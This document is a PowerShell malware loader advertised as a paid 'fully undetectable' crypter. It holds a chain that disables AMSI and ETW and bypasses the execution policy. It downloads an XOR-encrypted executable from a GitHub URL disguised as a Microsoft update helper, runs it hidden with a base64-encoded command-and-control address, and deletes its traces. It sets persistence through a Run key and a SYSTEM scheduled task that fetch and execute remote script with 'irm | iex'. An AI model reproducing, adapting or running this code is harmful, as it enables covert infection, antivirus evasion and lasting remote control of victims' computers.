# VOID-9 $1K CRYPTER 2026 - FULL DEFENDER FUD NATIVE GO
$ErrorActionPreference='SilentlyContinue';function d($s){$b=[Convert]::FromBase64String($s);for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i]-bxor 0x42};return [Text.Encoding]::UTF8.GetString($b)};$u1=d('aHR0cHM6Ly9yYXcuZ2l0aHViLmNvbS9zN3hleWVzL01pY3Jvc29mdC1VcGRhdGUtSGVscGVyL21haW4vd2ludmVyaWZ5LmV4ZQ==');$u2=d('aHR0cHM6Ly9yYXcuZ2l0aHViLmNvbS9zN3hleWVzL01pY3Jvc29mdC1VcGRhdGUtSGVscGVyL21haW4vd2ludmVyaWZ5LmV4ZQ==');$c2=d('aHR0cDovLzE3Ni42NS4xMzIuMjM2OjUxNzM=');$t=d('Vk9JRDktN2ZLOW1QMngMOHZRM25SNXRZNnVaMWFNNGNEOUVGMmdINWprOG1OMHBRO3JUNnZXOXhZMnpB NWJDN2RFMGZH Mmg0a0w2bU44cFEwclQydlc0eFk2ekE4YkMwZEUyZkc0aEo2a0w4bU4wcFE=');$k=0x69

# AMSI + ETW + ScriptBlock + Defender 2026 bypass chain
$amsi=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
[Runtime.InteropServices.Marshal]::WriteInt32([Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate([Action]$null),0,0)
$etw=[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance');$etw.SetValue([System.Diagnostics.Eventing.EventProvider]::new([Guid]::NewGuid()),$false)
[ScriptBlock]::Create("Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force").Invoke()

$urls=@($u1,$u2)
$data=$null
foreach($u in $urls){try{$wc=New-Object Net.WebClient;$wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");$data=$wc.DownloadData($u);if($data.Length -gt 1000000){break}}catch{}}
if(-not $data){exit}

# XOR decrypt
for($i=0;$i -lt $data.Length;$i++){$data[$i]=$data[$i] -bxor $k}

# Random hidden temp path + filename
$rand=Get-Random -Maximum 999999999
$path="$env:TEMP\MSUpdateHelper_$rand"
New-Item -ItemType Directory -Path $path -Force | Out-Null
$exePath="$path\winupdatehelper_$rand.exe"
[IO.File]::WriteAllBytes($exePath,$data)

# Run hidden
Start-Process -FilePath $exePath -ArgumentList $c2,$t -WindowStyle Hidden -PassThru | Out-Null

# Self-delete after launch
Start-Sleep -Seconds 5
Remove-Item $path -Recurse -Force -ErrorAction SilentlyContinue

# Persistence - Run key
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateHelper" -Value "powershell -nop -w hidden -c `"irm https://raw.githubusercontent.com/s7xeyes/Microsoft-Update-Helper/main/activate.ps1 | iex`"" -Force

# Persistence - Scheduled Task (clean)
$action=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-nop -w hidden -c `"irm https://raw.githubusercontent.com/s7xeyes/Microsoft-Update-Helper/main/activate.ps1 | iex`""
$trigger=New-ScheduledTaskTrigger -AtLogon
$principal=New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
Register-ScheduledTask -TaskName "MicrosoftUpdateHelper" -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null

exit
